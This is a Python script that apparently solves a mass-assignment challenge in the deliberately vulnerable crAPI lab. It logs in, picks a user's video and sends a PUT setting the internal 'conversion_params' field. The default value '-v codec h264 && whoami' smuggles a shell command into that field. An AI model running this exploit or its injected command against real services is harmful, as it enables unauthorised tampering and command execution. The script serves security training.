#!/usr/bin/env python3
"""
Challenge 10: Update internal video properties (Mass Assignment)

Flow:
  1. Login
  2. Get or upload a video
  3. Update the video with internal property 'conversion_params'
"""

import argparse
import sys
from pathlib import Path
from typing import Optional, List, Dict, Any

import requests
import yaml


def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)


def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    url = f"{base_url.rstrip('/')}/identity/api/auth/login"
    payload = {"email": email, "password": password}
    try:
        r = requests.post(url, json=payload, timeout=timeout)
        r.raise_for_status()
        data = r.json()
        return data.get("token") or data.get("access_token")
    except requests.RequestException as e:
        print(f"[!] Login failed: {e}")
        return None


def get_user_videos(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
    """Get user's videos"""
    url = f"{base_url.rstrip('/')}/identity/api/v2/user/videos"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=timeout)
        r.raise_for_status()
        data = r.json()
        return data.get("videos") or []
    except requests.RequestException as e:
        print(f"[!] get_user_videos failed: {e}")
        return []


def update_video_property(base_url: str, token: str, video_id: str, conversion_params: str, timeout: float = 15) -> Optional[Dict[str, Any]]:
    """Update video with internal property conversion_params"""
    url = f"{base_url.rstrip('/')}/identity/api/v2/user/videos/{video_id}"
    headers = {"Authorization": f"Bearer {token}"}
    payload = {
        "conversion_params": conversion_params
    }
    try:
        r = requests.put(url, json=payload, headers=headers, timeout=timeout)
        r.raise_for_status()
        return r.json()
    except requests.RequestException as e:
        print(f"[!] update_video_property failed: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(description="Challenge 10: Mass Assignment - Video Property")
    parser.add_argument("--config", default="../crapi_config.yaml", help="Config file")
    parser.add_argument("--user-email", default="mike1@my.lab", help="User email")
    parser.add_argument("--conversion-params", default="-v codec h264 && whoami", help="Conversion params payload")
    args = parser.parse_args()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"Config not found: {config_path}", file=sys.stderr)
        sys.exit(1)

    cfg = load_config(config_path)
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 10: Mass Assignment - Video Property")
    print(f"[*] Target: {base_url}")
    print("-" * 60)

    print(f"\n[1] Logging in...")
    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed")
        sys.exit(1)
    print("[+] Logged in")

    print(f"\n[2] Getting user videos...")
    videos = get_user_videos(base_url, token)
    if not videos:
        print("[!] No videos found")
        sys.exit(1)

    video = videos[0]
    video_id = video.get("id")
    print(f"[+] Using video ID: {video_id}")

    print(f"\n[3] Mass Assignment ATTACK: Updating video with internal property...")
    print(f"[!] Payload: conversion_params = {args.conversion_params}")

    result = update_video_property(base_url, token, video_id, args.conversion_params)

    if result:
        if "conversion_params" in result:
            print(f"[+] SUCCESS! Internal property was updated")
            print(f"[+] Response: {result}")
            print(f"\n[!] VULNERABLE: Can modify internal video properties via Mass Assignment")
        else:
            print(f"[!] Update may not have worked")
    else:
        print("[!] Update failed")


if __name__ == "__main__":
    main()
